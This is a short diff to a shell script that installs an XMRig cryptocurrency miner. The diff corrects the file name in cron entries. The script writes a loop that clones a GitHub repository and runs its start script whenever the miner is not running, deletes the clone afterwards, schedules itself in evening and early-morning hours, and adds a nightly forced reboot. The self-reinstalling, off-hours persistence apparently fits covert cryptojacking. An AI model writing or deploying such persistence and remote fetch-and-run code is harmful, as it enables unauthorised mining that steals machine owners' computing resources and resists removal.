@@ -15,7 +15,7 @@ cd ..
 echo -e "while : ; do\n if pgrep -f xmrig; then\n  true\n else\n  git clone https://github.com/DhDread/dan_xmrig_install.git && /usr/bin/bash ~/dan_xmrig_install/mine_start &\n fi\n sleep 600\n rm -rfv ~/dan_xmrig_install\ndone" > check_mine
 #sudo chmod +x mine_start
 sudo chmod +x check_mine
-(crontab -l 2>/dev/null || true; echo "*/20 17-23 * * * /usr/bin/bash check_mine.py") | crontab - 
-(crontab -l 2>/dev/null || true; echo "*/20 1-3 * * * /usr/bin/bash check_mine.py") | crontab - 
+(crontab -l 2>/dev/null || true; echo "*/20 17-23 * * * /usr/bin/bash check_mine") | crontab - 
+(crontab -l 2>/dev/null || true; echo "*/20 1-3 * * * /usr/bin/bash check_mine") | crontab - 
 (crontab -l 2>/dev/null || true; echo "05 4 * * * sudo reboot now") | crontab -
 rm -rfv ~/dan_xmrig_install
